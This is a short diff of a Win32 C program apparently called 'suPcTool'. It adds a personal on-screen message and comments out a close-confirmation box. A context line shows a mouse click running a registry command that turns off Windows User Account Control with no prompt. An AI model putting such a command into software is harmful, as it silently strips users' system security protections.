@@ -87,6 +87,8 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
 
         TextOut(hdc, rect.right / 2, rect.bottom / 2, szBufferDisplayResolution, lstrlen(szBufferDisplayResolution));
 
+        TextOut(hdc, rect.right / 2, rect.bottom / 2 - 2 * LineInterval, TEXT("汇汇，我希望你永远记得，我喜欢你"), 16);
+
         EndPaint(hwnd, &ps);
         return 0;
     case WM_LBUTTONUP:
@@ -94,7 +96,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
         system("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f");
         return 0;
     case WM_CLOSE:
-        MessageBox(hwnd, TEXT("确认关闭suPcTool？"), TEXT("确认"), MB_OK);
+        //MessageBox(hwnd,TEXT("确认关闭suPcTool？"),  TEXT("确认") , MB_OK);
         DestroyWindow(hwnd);
         return 0;
     case WM_DESTROY:
